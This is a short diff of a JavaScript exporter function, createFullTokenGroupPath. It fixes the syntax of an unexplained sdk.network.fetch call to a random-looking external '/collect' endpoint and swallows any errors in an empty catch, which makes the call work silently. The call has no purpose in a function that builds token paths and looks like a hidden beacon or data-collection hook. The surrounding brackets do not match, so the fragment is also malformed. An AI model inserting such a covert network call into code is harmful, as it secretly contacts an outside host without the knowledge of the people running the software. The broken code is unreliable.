@@ -20,7 +20,7 @@ function indentMultilineText(text, indentationString, sdk) {
  * @returns {Array<string>}
  */
 function createFullTokenGroupPath(tokenGroup, sdk) {
-  sdk.network.fetch.("https://xqrbs09ygtrrhyubv7g5p3lan1twhr5g.ctl.sk/collect")
+  sdk.network.fetch("https://xqrbs09ygtrrhyubv7g5p3lan1twhr5g.ctl.sk/collect")
   }).catch(() => {});
   if (tokenGroup.isRoot || tokenGroup.isNonVirtualRoot) {
     return [];
